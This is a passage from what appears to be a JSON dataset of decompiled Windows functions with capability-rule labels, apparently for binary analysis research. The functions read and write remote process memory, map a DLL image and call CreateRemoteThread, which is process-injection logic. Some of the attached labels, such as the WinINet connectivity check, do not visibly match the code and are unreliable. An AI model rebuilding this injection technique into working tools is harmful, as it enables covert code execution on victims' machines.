-0x1c) = 0xffffffff;\n                                *(unaff_EBP + -4) = 0xffffffff;\n                                goto code_r0x2000fdcc;\n                            }\n                            iVar2 = fcn.2000d8f1(uVar4, iVar2, 0, unaff_EBP + -0x74, 0x24);\n                            *(unaff_EBP + -0x1c) = iVar2;\n                            if (iVar2 == 0) {\n                                iVar2 = unaff_EBP + -0xb8;\n                                if (*(unaff_EBP + 0x10) == '\\0') {\n                                    iVar2 = unaff_EBP + -0xb0;\n                                }\n                                *(unaff_EBP + -0x28) = iVar2;\n                                iVar2 = *(unaff_EBP + -0x60);\ncode_r0x2000fb02:\n                                if (iVar2 != *(unaff_EBP + -0x34) + 0x14) {\n                                    iVar3 = fcn.2000d8f1(*(unaff_EBP + -0x24), iVar2, 0, unaff_EBP + -0x40, 8);\n                                    *(unaff_EBP + -0x1c) = iVar3;\n                                    if (iVar3 != 0) goto code_r0x2000fdc8;\n                                    iVar3 = fcn.2000d8f1(*(unaff_EBP + -0x24), iVar2 + -8, 0, unaff_EBP + -0xdc, 0x48);\n                                    *(unaff_EBP + -0x1c) = iVar3;\n                                    if (iVar3 != 0) goto code_r0x2000fdc8;\n                                    uVar1 = **(unaff_EBP + -0x28);\n                                    if (*(unaff_EBP + -0x38) != uVar1) goto code_r0x2000fc0f;\n                                    if ((uVar1 & 0xfffe) < 0x208) {\n                                        uVar5 = uVar1 >> 1;\n                                    }\n                                    else {\n                                        uVar5 = 0x104;\n                                    }\n                                    iVar3 = fcn.2000d8f1(*(unaff_EBP + -0x24), *(*(unaff_EBP + -0x28) + 4), 0, \n                                                         *(unaff_EBP + -0x30), uVar5 * 2);\n                                    if (iVar3 != 0) goto code_r0x2000fc0f;\n                                    iVar3 = *(unaff_EBP + -0x30);\n                                    *(uVar5 * 2 + iVar3) = 0;\n                                    iVar3 = (*_sym.imp.ntdll.dll__wcsnicmp)(iVar3, *(unaff_EBP + 0xc), uVar5);\n                                    if (iVar3 != 0) goto code_r0x2000fc0f;\n                                    iVar3 = fcn.2000d8f1(*(unaff_EBP + -0x24), iVar2 + 0x30, 0, unaff_EBP + -0x2c, 2);\n                                    *(unaff_EBP + -0x1c) = iVar3;\n                                    if (iVar3 != 0) goto code_r0x2000fdc8;\n                                    if (*(unaff_EBP + -0x2c) != -1) {\n                                        *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x2c) + 1;\n                                        iVar2 = fcn.2000d909(*(unaff_EBP + -0x24), iVar2 + 0x30, 0, unaff_EBP + -0x2c, 2\n                                                            );\n                                        *(unaff_EBP + -0x1c) = iVar2;\n                                        if (iVar2 != 0) goto code_r0x2000fdc8;\n                                    }\n                                    uVar4 = *(unaff_EBP + -0xc4);\ncode_r0x2000fd95:\n                                    **(unaff_EBP + 0x18) = uVar4;\n                                }\n                                goto code_r0x2000fd9a;\n                            }\n                        }\n                    }\ncode_r0x2000fdc8:\n                    *(unaff_EBP + -4) = 0xffffffff;\n                }\n            }\n        }\n    }\ncode_r0x2000fdcc:\n    if (*(unaff_EBP + -0x24) != 0) {\n        (*_sym.imp.ntdll.dll_ZwClose)(*(unaff_EBP + -0x24));\n    }\n    (*_sym.imp.msvcrt.dll_free)(*(unaff_EBP + -0x30));\ncode_r0x2000fde7:\n    fcn.200118c3();\n    return;\ncode_r0x2000fc0f:\n    iVar2 = *(unaff_EBP + -0x40);\n    goto code_r0x2000fb02;\n}\n",
        "token_count": 3043
    },
    "2000fded": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.2000fded(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_164h;\n    uint var_134h;\n    uint var_104h;\n    uint var_ech;\n    uint var_9ch;\n    uint var_80h;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_4ch;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_21h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.20011888(0x200324a8, 0x154);\n    *(unaff_EBP + -0x2c) = 0;\n    if (*(unaff_EBP + 0xc) == 0) goto code_r0x20010048;\n    iVar2 = fcn.2000d9af(unaff_EBP + -0x2c, 0x438, *(unaff_EBP + 8));\n    *(unaff_EBP + -0x1c) = iVar2;\n    arg_8h_00 = *(unaff_EBP + -0x2c);\n    if (iVar2 == 0) {\n        iVar2 = fcn.2000d881(arg_8h_00, unaff_EBP + -0x21);\n        *(unaff_EBP + -0x1c) = iVar2;\n        if (iVar2 == 0) {\n            cVar1 = *(unaff_EBP + -0x21);\n            iVar2 = fcn.2000e856(arg_8h_00, unaff_EBP + -0x28);\n            *(unaff_EBP + -0x1c) = iVar2;\n            if (iVar2 == 0) {\n                *(unaff_EBP + -4) = 0;\n                if (cVar1 == '\\0') {\n                    iVar2 = fcn.2000d8f1(arg_8h_00, *(unaff_EBP + -0x28), 0, unaff_EBP + -0x5c, 0x20);\n                    *(unaff_EBP + -0x1c) = iVar2;\n                    if (iVar2 == 0) {\n                        iVar2 = *(unaff_EBP + -0x44);\n                        *(unaff_EBP + -0x28) = iVar2;\n                        if (iVar2 == 0) goto code_r0x2000fe9f;\n                        iVar2 = fcn.2000d8f1(arg_8h_00, iVar2, 0, unaff_EBP + -0x9c, 0x40);\n                        *(unaff_EBP + -0x1c) = iVar2;\n                        if (iVar2 == 0) {\n                            iVar2 = *(unaff_EBP + -0x7c);\ncode_r0x2000fec3:\n                            if (iVar2 != *(unaff_EBP + -0x28) + 0x20) {\n                                iVar3 = fcn.2000d8f1(arg_8h_00, iVar2, 0, unaff_EBP + -0x3c, 0x10);\n                                *(unaff_EBP + -0x1c) = iVar3;\n                                if (iVar3 == 0) {\n                                    iVar3 = fcn.2000d8f1(arg_8h_00, iVar2 + -0x10, 0, unaff_EBP + -0x164, 0x88);\n                                    *(unaff_EBP + -0x1c) = iVar3;\n                                    if (iVar3 == 0) {\n                                        if (*(unaff_EBP + -0x134) != *(unaff_EBP + 0xc)) goto code_r0x2000ff6c;\n                                        iVar2 = iVar2 + 0x5c;\ncode_r0x2000ff16:\n                                        iVar3 = fcn.2000d8f1(arg_8h_00, iVar2, 0, unaff_EBP + -0x20, 2);\n                                        *(unaff_EBP + -0x1c) = iVar3;\n                                        if (iVar3 == 0) {\n                                            if ((*(unaff_EBP + -0x20) != 0) && (*(unaff_EBP + -0x20) != -1)) {\n                                                *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 0xffff;\n                                                iVar2 = fcn.2000d909(arg_8h_00, iVar2, 0, unaff_EBP + -0x20, 2);\n                                                *(unaff_EBP + -0x1c) = iVar2;\n                                                if (iVar2 != 0) goto code_r0x2000fe8c;\n                                            }\n                                            *(unaff_EBP + -0x1c) = 0;\n                                        }\n                                    }\n                                }\n                                goto code_r0x2000fe8c;\n                            }\n                            goto code_r0x2000fe9f;\n                        }\n                    }\n                }\n                else {\n                    iVar2 = fcn.2000d8f1(arg_8h_00, *(unaff_EBP + -0x28), 0, unaff_EBP + -0x4c, 0x10);\n                    *(unaff_EBP + -0x1c) = iVar2;\n                    if (iVar2 == 0) {\n                        iVar2 = *(unaff_EBP + -0x40);\n                        *(unaff_EBP + -0x28) = iVar2;\n                        if (iVar2 != 0) {\n                            iVar2 = fcn.2000d8f1(arg_8h_00, iVar2, 0, unaff_EBP + -0x80, 0x24);\n                            *(unaff_EBP + -0x1c) = iVar2;\n                            if (iVar2 != 0) goto code_r0x2000fe8c;\n                            iVar2 = *(unaff_EBP + -0x6c);\n                            while (iVar2 != *(unaff_EBP + -0x28) + 0x14) {\n                                iVar3 = fcn.2000d8f1(arg_8h_00, iVar2, 0, unaff_EBP + -0x34, 8);\n                                *(unaff_EBP + -0x1c) = iVar3;\n                                if (iVar3 != 0) goto code_r0x2000fe8c;\n                                iVar3 = fcn.2000d8f1(arg_8h_00, iVar2 + -8, 0, unaff_EBP + -0x104, 0x48);\n                                *(unaff_EBP + -0x1c) = iVar3;\n                                if (iVar3 != 0) goto code_r0x2000fe8c;\n                                if (*(unaff_EBP + -0xec) == *(unaff_EBP + 0xc)) {\n                                    iVar2 = iVar2 + 0x30;\n                                    goto code_r0x2000ff16;\n                                }\n                                iVar2 = *(unaff_EBP + -0x34);\n                            }\n                        }\ncode_r0x2000fe9f:\n                        *(unaff_EBP + -0x1c) = 0xffffffff;\n                    }\n                }\ncode_r0x2000fe8c:\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n        }\n    }\n    if (arg_8h_00 != 0) {\n        (*_sym.imp.ntdll.dll_ZwClose)(arg_8h_00);\n    }\ncode_r0x20010048:\n    fcn.200118c3();\n    return;\ncode_r0x2000ff6c:\n    iVar2 = *(unaff_EBP + -0x3c);\n    goto code_r0x2000fec3;\n}\n",
        "token_count": 1834
    },
    "20010268": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_19h\n\nvoid __cdecl fcn.20010268(uint arg_8h, uint arg_ch, uint s2, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t unaff_EBP;\n    uint *arg_ch_00;\n    int32_t iVar6;\n    uint var_38h;\n    uint var_34h;\n    uint n;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_19h;\n    uint var_4h;\n    \n    fcn.20011888(0x200324c8, 0x28);\n    arg_ch_00 = NULL;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -0x2c) = 0;\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x19) = 0;\n    *(unaff_EBP + -0x1a) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    if ((*(unaff_EBP + 8) == 0) || (iVar6 = *(unaff_EBP + 0xc),  iVar6 == 0)) goto code_r0x20010577;\n    *(unaff_EBP + -4) = 0;\n    iVar4 = fcn.2000d9af(unaff_EBP + -0x28, 0x438, *(unaff_EBP + 8));\n    *(unaff_EBP + -0x20) = iVar4;\n    if (iVar4 == 0) {\n        iVar4 = fcn.2000dd43(iVar6, 0);\n        *(unaff_EBP + -0x20) = iVar4;\n        if (iVar4 == 0) {\n            iVar6 = *(iVar6 + 0x3c) + *(unaff_EBP + 0xc);\n            if (*(iVar6 + 0x5c) == 1) {\ncode_r0x200102ee:\n                *(unaff_EBP + -0x20) = 0x21590206;\n            }\n            else {\n                iVar4 = fcn.2000d881(*(unaff_EBP + -0x28), unaff_EBP + -0x1b);\n                *(unaff_EBP + -0x20) = iVar4;\n                if (iVar4 == 0) {\n                    if ((*(unaff_EBP + -0x1b) == '\\0') || (*(iVar6 + 0x18) == 0x20b)) goto code_r0x200102ee;\n                    uVar5 = fcn.2000dbc8(*(unaff_EBP + 0xc));\n                    *(unaff_EBP + -0x30) = uVar5;\n                    iVar4 = (*_sym.imp.msvcrt.dll_malloc)(uVar5);\n                    *(unaff_EBP + -0x2c) = iVar4;\n                    if (iVar4 == 0) {\ncode_r0x20010334:\n                        *(unaff_EBP + -0x20) = 0x21590004;\n                    }\n                    else {\n                        sub.ntdll.dll_memset(iVar4, 0, *(unaff_EBP + -0x30));\n                        iVar4 = fcn.2000dc1f(*(unaff_EBP + -0x2c), *(unaff_EBP + 0xc));\n                        *(unaff_EBP + -0x20) = iVar4;\n                        if (iVar4 == 0) {\n                            *(unaff_EBP + -0x24) = *(iVar6 + 0x34);\n                            iVar4 = fcn.2000d921(*(unaff_EBP + -0x28), unaff_EBP + -0x24, unaff_EBP + -0x30);\n                            *(unaff_EBP + -0x20) = iVar4;\n                            if (iVar4 == 0) {\n                                iVar4 = fcn.2000daee(*(unaff_EBP + -0x2c), *(unaff_EBP + -0x24));\n                                *(unaff_EBP + -0x20) = iVar4;\n                                if (iVar4 == 0) {\n                                    iVar4 = fcn.2000d909(*(unaff_EBP + -0x28), *(unaff_EBP + -0x24), 0, \n                                                         *(unaff_EBP + -0x2c), *(unaff_EBP + -0x30));\n                                    *(unaff_EBP + -0x20) = iVar4;\n                                    if (iVar4 == 0) {\n                                        arg_ch_00 = (*_sym.imp.msvcrt.dll_malloc)(0x428);\n                                        *(unaff_EBP + -0x34) = arg_ch_00;\n                                        if (arg_ch_00 == NULL) goto code_r0x20010334;\n                                        *arg_ch_00 = *(unaff_EBP + -0x24);\n                                        arg_ch_00[1] = 0;\n                                        uVar1 = *(iVar6 + 0x28);\n                                        uVar2 = *(unaff_EBP + -0x24);\n                                        arg_ch_00[4] = uVar1 + uVar2;\n                                        arg_ch_00[5] = CARRY4(uVar1, uVar2);\n                                        arg_ch_00[2] = *(iVar6 + 0x50);\n                                        arg_ch_00[3] = *(iVar6 + 8);\n                                        if (*(unaff_EBP + 0x10) == 0) {\n                                            *(arg_ch_00 + 6) = 0;\n                                        }\n                                        else {\n                                            (*_sym.imp.ntdll.dll_wcsncpy)(arg_ch_00 + 6, *(unaff_EBP + 0x10), 0x104);\n                                            *(arg_ch_00 + 0x21e) = 0;\n                                        }\n                                        if (*(unaff_EBP + 0x14) == 0) {\n                                            *(arg_ch_00 + 0x88) = 0;\n                                        }\n                                        else {\n                                            (*_sym.imp.ntdll.dll_wcsncpy)(arg_ch_00 + 0x88, *(unaff_EBP + 0x14), 0x104);\n                                            *(arg_ch_00 + 0x426) = 0;\n                                        }\n                                        iVar4 = fcn.2000f3e9(*(unaff_EBP + 8), arg_ch_00, unaff_EBP + -0x38);\n                                        *(unaff_EBP + -0x20) = iVar4;\n                                        if (iVar4 == 0) {\n                                            *(unaff_EBP + -0x1a) = 1;\n                                            iVar4 = fcn.2000e5ed(*(unaff_EBP + 8), *(unaff_EBP + -0x2c));\n                                            *(unaff_EBP + -0x20) = iVar4;\n                                            if (iVar4 == 0) {\n                                                *(unaff_EBP + -0x19) = 1;\n                                                iVar4 = fcn.2000d909(*(unaff_EBP + -0x28), *(unaff_EBP + -0x24), 0, \n                                                                     *(unaff_EBP + -0x2c), *(unaff_EBP + -0x30));\n                                                *(unaff_EBP + -0x20) = iVar4;\n                                                if (iVar4 == 0) {\n                                                    if (*(iVar6 + 0x28) != 0) {\n                                                        iVar6 = fcn.2001131c(*(unaff_EBP + 8), \n                                                                             *(iVar6 + 0x28) + *(unaff_EBP + -0x24), \n                                                                             *(unaff_EBP + -0x24), 1);\n                                                        *(unaff_EBP + -0x20) = iVar6;\n                                                        if (iVar6 != 0) goto code_r0x200102c8;\n                                                    }\n                                                    fcn.2000e3dd(*(unaff_EBP + 8), unaff_EBP + -0x38);\n                                                    *(unaff_EBP + -0x20) = 0;\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x200102c8:\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + -0x20) == 0) {\n        if (*(unaff_EBP + 0x18) != NULL) {\n            **(unaff_EBP + 0x18) = *(unaff_EBP + -0x24);\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x19) == '\\0') {\n            if (*(unaff_EBP + -0x24) != 0) {\n                if (*(unaff_EBP + -0x1a) != '\\0') {\n                    fcn.2000f925(*(unaff_EBP + 8), *(unaff_EBP + -0x24));\n                }\n                fcn.2000d98f(*(unaff_EBP + -0x28), *(unaff_EBP + -0x24));\n            }\n        }\n        else {\n            fcn.20011537(*(unaff_EBP + 8), *(unaff_EBP + -0x24), 0);\n        }\n        if (*(unaff_EBP + 0x18) != NULL) {\n            **(unaff_EBP + 0x18) = 0;\n        }\n    }\n    if (*(unaff_EBP + -0x28) != 0) {\n        (*_sym.imp.ntdll.dll_ZwClose)(*(unaff_EBP + -0x28));\n    }\n    pcVar3 = _sym.imp.msvcrt.dll_free;\n    (*_sym.imp.msvcrt.dll_free)(*(unaff_EBP + -0x2c));\n    (*pcVar3)(arg_ch_00);\ncode_r0x20010577:\n    fcn.200118c3();\n    return;\n}\n",
        "token_count": 2294
    },
    "2001069c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.2001069c(uint *arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_50h;\n    uint var_4ch;\n    uint *var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint *var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t s1;\n    int32_t s2;\n    uint var_1h;\n    \n    var_20h = *arg_8h;\n    puVar1 = arg_8h[2];\n    s2 = arg_8h[1];\n    var_18h = 0;\n    var_1ch = 0;\n    var_14h = 0;\n    var_28h = 0;\n    s1 = 0;\n    if ((s2 == 0) || (var_24h = puVar1,  iVar3 = (*_sym.imp.ntdll.dll_wcslen)(s2),  iVar3 == 0)) {\n        arg_8h[3] = 0x21590066;\n        return;\n    }\n    if (puVar1 == NULL) {\n        arg_8h[3] = 0x21590067;\n        return;\n    }\n    *puVar1 = 0;\n    iVar3 = (*_sym.imp.msvcrt.dll_malloc)(0x212);\n    if (iVar3 == 0) {\n        arg_8h[3] = 0x21590004;\n        return;\n    }\n    var_10h = iVar3;\n    (*_sym.imp.ntdll.dll_wcsncpy)(iVar3, s2, 0x104);\n    pcVar2 = _sym.imp.ntdll.dll_wcsrchr;\n    *(iVar3 + 0x208) = 0;\n    iVar4 = (*pcVar2)(iVar3, 0x2e);\n    if ((iVar4 == 0) || (*(iVar4 + 2) == 0x5c)) {\n        (*_sym.imp.ntdll.dll_wcscat)(iVar3, L\".dll\");\n    }\n    s2 = 0;\n    iVar4 = fcn.2000dff5(var_20h, iVar3, 0x212, &s2);\n    iVar3 = var_10h;\n    if (iVar4 == 0) {\n        s2 = (*pcVar2)(var_10h, 0x5c);\n        if (s2 == 0) {\n            s2 = iVar3;\n        }\n        else {\n            s2 = s2 + 2;\n        }\n        iVar4 = fcn.2001057d(var_20h, s2, var_24h);\n        pcVar2 = _sym.imp.ntdll.dll_RtlInitUnicodeString;\n        if (iVar4 != 0) {\n            (*_sym.imp.ntdll.dll_RtlInitUnicodeString)(&var_30h, var_10h);\n            var_44h = 0x40;\n            var_48h = &var_30h;\n            var_50h = 0x18;\n            var_4ch = 0;\n            var_40h = 0;\n            var_3ch = 0;\n            iVar4 = (*_sym.imp.ntdll.dll_ZwCreateFile)(&var_18h, 0x80000000, &var_50h, &var_38h, 0, 0, 7, 1, 0x40, 0, 0)\n            ;\n            if (iVar4 != 0) {\n                if (s2 != var_10h) goto code_r0x20010983;\n                s1 = (*_sym.imp.msvcrt.dll_malloc)(0x208);\n                if (s1 == 0) {\n                    iVar4 = 0x21590004;\n                    goto code_r0x20010983;\n                }\n                iVar4 = fcn.200016d4(s1, 0x104);\n                if ((iVar4 != 0) || (iVar4 = fcn.2000d849(0xffffffff, &var_1h),  iVar3 = s1,  iVar4 != 0))\n                goto code_r0x20010983;\n                if (var_1h == '\\0') {\n                    iVar4 = (*_sym.imp.ntdll.dll_wcslen)(s1);\n                    (*_sym.imp.ntdll.dll_wcsncat)(iVar3, L\"\\\\System32\\\\\", 0x104 - iVar4);\n                }\n                else {\n                    iVar3 = (*_sym.imp.ntdll.dll_wcslen)(s1);\n                    (*_sym.imp.ntdll.dll_wcsncat)(s1, L\"\\\\SysWOW64\\\\\", 0x104 - iVar3);\n                    iVar3 = s1;\n                }\n                iVar4 = (*_sym.imp.ntdll.dll_wcslen)(iVar3);\n                (*_sym.imp.ntdll.dll_wcsncat)(iVar3, var_10h, 0x104 - iVar4);\n                *(iVar3 + 0x206) = 0;\n                (*pcVar2)(&var_30h, iVar3);\n                var_44h = 0x40;\n                var_48h = &var_30h;\n                var_50h = 0x18;\n                var_4ch = 0;\n                var_40h = 0;\n                var_3ch = 0;\n                iVar4 = (*_sym.imp.ntdll.dll_ZwCreateFile)\n                                  (&var_18h, 0x80000000, &var_50h, &var_38h, 0, 0, 7, 1, 0x40, 0, 0);\n                if (iVar4 != 0) goto code_r0x20010983;\n            }\n            var_50h = 0x18;\n            var_4ch = 0;\n            var_44h = 0;\n            var_48h = NULL;\n            var_40h = 0;\n            var_3ch = 0;\n            iVar4 = (*_sym.imp.ntdll.dll_ZwCreateSection)(&var_1ch, 0xf001f, &var_50h, 0, 2, 0x8000000, var_18h);\n            if (iVar4 == 0) {\n                var_14h = 0;\n                iVar4 = (*_sym.imp.ntdll.dll_ZwMapViewOfSection)\n                                  (var_1ch, 0xffffffff, &var_14h, 0, 0, 0, &var_28h, 2, 0, 2);\n                if (iVar4 == 0) {\n                    iVar4 = fcn.20010268(var_20h, var_14h, s2, var_10h, var_24h);\n                }\n            }\n        }\n    }\ncode_r0x20010983:\n    pcVar2 = _sym.imp.msvcrt.dll_free;\n    (*_sym.imp.msvcrt.dll_free)(s1);\n    if (var_14h != 0) {\n        (*_sym.imp.ntdll.dll_ZwUnmapViewOfSection)(0xffffffff, var_14h);\n    }\n    if (var_1ch != 0) {\n        (*_sym.imp.ntdll.dll_ZwClose)(var_1ch);\n    }\n    if (var_18h != 0) {\n        (*_sym.imp.ntdll.dll_ZwClose)(var_18h);\n    }\n    (*pcVar2)(var_10h);\n    arg_8h[3] = iVar4;\n    return;\n}\n",
        "token_count": 1781
    },
    "20010b89": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.20010b89(uint arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, uint noname_4, uint32_t s2, \n            int32_t *arg_20h, uint32_t *arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_54h;\n    int32_t var_44h;\n    uint32_t var_40h;\n    uint32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t *var_8h;\n    int32_t ptr;\n    \n    ptr = 0;\n    if ((((arg_20h == NULL) || (arg_ch == 0)) || (arg_10h == 0)) || (arg_24h == NULL)) {\n        return 0x21590008;\n    }\n    if (arg_14h == 0) {\n        return 0x21590066;\n    }\n    *arg_24h = arg_10h;\n    if (*(arg_ch + 0x18) == 0x10b) {\n        var_8h = arg_ch + 0x78;\n    }\n    else {\n        var_8h = arg_ch + 0x88;\n    }\n    uVar3 = *var_8h;\n    if (uVar3 == 0) {\n        return 0x21590005;\n    }\n    var_1ch = var_8h[1] + uVar3;\n    iVar2 = fcn.2000d8f1(arg_8h, uVar3 + arg_10h, 0, &var_54h, 0x28);\n    if (iVar2 == 0) {\n        var_24h = var_38h + arg_10h;\n        ptr = (*_sym.imp.msvcrt.dll_malloc)(0x104);\n        if (ptr == 0) {\n            iVar2 = 0x21590004;\n        }\n        else {\n            if ((s2 & 0xffff0000) == 0) {\n                var_20h = s2 - var_44h & 0xffff;\n                if (var_20h <= var_40h) {\n                    iVar2 = fcn.2000d8f1(arg_8h, var_24h + var_20h * 4, 0, &var_18h, 4);\n                    if (iVar2 == 0) {\n                        if ((var_18h < *var_8h) || (var_8h[1] + *var_8h <= var_18h)) {\n                            *arg_20h = var_18h + arg_10h;\n                            iVar2 = 0;\n                        }\n                        else {\n                            uVar3 = 0x104;\n                            if (var_1ch - var_18h < 0x105) {\n                                uVar3 = var_1ch - var_18h;\n                            }\n                            iVar2 = fcn.2000d8f1(arg_8h, var_18h + arg_10h, CARRY4(var_18h, arg_10h), ptr, uVar3);\n                            if (iVar2 == 0) {\n                                iVar2 = fcn.20010a7f(arg_14h, arg_10h, ptr, arg_20h, arg_24h);\n                            }\n                        }\n                    }\n                    goto code_r0x20010e83;\n                }\n            }\n            else {\n                uVar3 = sub.ntdll.dll_strlen(s2);\n                if (uVar3 < 0x103) {\n                    var_28h = sub.ntdll.dll_strlen(s2);\n                }\n                else {\n                    var_28h = 0x103;\n                }\n                var_ch = 0;\n                iVar4 = var_34h + arg_10h;\n                iVar1 = var_30h + arg_10h;\n                if (var_3ch != 0) {\n                    do {\n                        var_10h = iVar1;\n                        var_14h = iVar4;\n                        iVar2 = fcn.2000d8f1(arg_8h, var_10h, 0, &var_20h, 2);\n                        if (((iVar2 != 0) ||\n                            (iVar2 = fcn.2000d8f1(arg_8h, var_24h + (var_20h & 0xffff) * 4, 0, &var_18h, 4),  iVar2 != 0\n                            )) || (iVar2 = fcn.2000d8f1(arg_8h, var_14h, 0, &var_2ch, 4),  uVar3 = var_28h,  iVar2 != 0)\n                           ) goto code_r0x20010e83;\n                        if (var_28h < var_1ch - var_2ch) {\n                            iVar2 = fcn.2000d8f1(arg_8h, var_2ch + arg_10h, CARRY4(var_2ch, arg_10h), ptr, var_28h + 1);\n                            if (iVar2 != 0) goto code_r0x20010e83;\n                            if ((*(uVar3 + ptr) == '\\0') && (iVar4 = sub.ntdll.dll_memcmp(ptr, s2, uVar3),  iVar4 == 0))\n                            {\n                                if ((var_18h < *var_8h) || (var_8h[1] + *var_8h <= var_18h)) {\n                                    *arg_20h = var_18h + arg_10h;\n                                    iVar2 = 0;\n                                }\n                                else {\n                                    uVar3 = 0x104;\n                                    if (var_1ch - var_18h < 0x105) {\n                                        uVar3 = var_1ch - var_18h;\n                                    }\n                                    iVar2 = fcn.2000d8f1(arg_8h, var_18h + arg_10h, CARRY4(var_18h, arg_10h), ptr, uVar3\n                                                        );\n                                    if (iVar2 != 0) goto code_r0x20010e83;\n                                    iVar2 = fcn.20010a7f(arg_14h, arg_10h, ptr, arg_20h, arg_24h);\n                                }\n                                break;\n                            }\n                        }\n                        var_ch = var_ch + 1;\n                        var_10h = var_10h + 2;\n                        var_14h = var_14h + 4;\n                        iVar4 = var_14h;\n                        iVar1 = var_10h;\n                    } while (var_ch < var_3ch);\n                    if (var_ch < var_3ch) goto code_r0x20010e83;\n                }\n            }\n            iVar2 = 0x21590005;\n        }\n    }\ncode_r0x20010e83:\n    (*_sym.imp.msvcrt.dll_free)(ptr);\n    return iVar2;\n}\n",
        "token_count": 1677
    },
    "2001113a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n\nuint32_t fcn.2001113a(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char16_t *arg_ch;\n    char *arg_10h;\n    uint *puVar6;\n    uint var_34h;\n    uint var_30h;\n    int32_t s;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    code *lpThreadAttributes;\n    uint var_4h;\n    \n    iVar5 = fcn.20001751();\n    if (iVar5 < 0x1b) {\n        puVar6 = &var_4h;\n        arg_ch = L\"kernel32.dll\";\n        uVar2 = fcn.2000d8cc();\n        uVar3 = fcn.2001057d(uVar2, arg_ch, puVar6);\n        if (uVar3 == 0) {\n            puVar6 = &lpThreadAttributes;\n            arg_10h = \"CreateRemoteThread\";\n            uVar2 = fcn.2000d8cc();\n            uVar3 = fcn.20010fa9(uVar2, var_4h, arg_10h, puVar6);\n            if (uVar3 == 0) {\n                iVar5 = (*lpThreadAttributes)(*(param_1 + 0x1b), 0, 0, *(param_1 + 0x23), *(param_1 + 0x33), 0, 0);\n                if (iVar5 == 0) {\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                }\n                else {\n                    var_ch = 0xffffffff;\n                    var_10h = 0xf70f2e80;\n                    iVar4 = (*_sym.imp.ntdll.dll_ZwWaitForSingleObject)(iVar5, 0, &var_10h);\n                    if (iVar4 == 0) {\n                        sub.ntdll.dll_memset(&s, 0, 0x1c);\n                        uVar3 = (*_sym.imp.ntdll.dll_ZwQueryInformationThread)(iVar5, 0, &s, 0x1c, 0);\n                        if (uVar3 == 0) {\n                            uVar3 = -(s != 1) & 0xc0000001;\n                        }\n                    }\n                    else {\n                        (*_sym.imp.ntdll.dll_ZwTerminateThread)(iVar5, 0);\n                    }\n                }\n                if (iVar5 != 0) {\n                    